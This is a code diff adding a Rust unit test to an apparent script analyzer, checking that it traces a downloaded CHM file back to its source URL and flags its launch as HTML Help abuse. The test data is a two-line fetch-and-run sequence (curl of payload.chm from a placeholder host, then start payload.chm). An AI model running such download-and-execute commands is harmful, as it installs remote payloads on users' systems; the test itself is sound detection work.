@@ -1506,6 +1506,32 @@ payload.js"#;
     }
 
     #[test]
+    fn implicit_chm_execution_resolves_prior_download_source_url() {
+        let script = br#"curl -o payload.chm https://implicit-chm-source.example/payload.chm
+start payload.chm"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "payload.chm"
+                            && url == "https://implicit-chm-source.example/payload.chm"
+                )
+            }),
+            "implicit CHM execution did not resolve prior download source: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "hh" && cmd == "payload.chm")
+            ),
+            "implicit CHM execution was not marked as HTML Help: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn cmd_vd_c_mashed_flag_enables_delayed_expansion() {
         // `cmd /V/D/c "..."` is a single token mashing three flags. The
         // flags-section parser used to bail because the token's 2-char
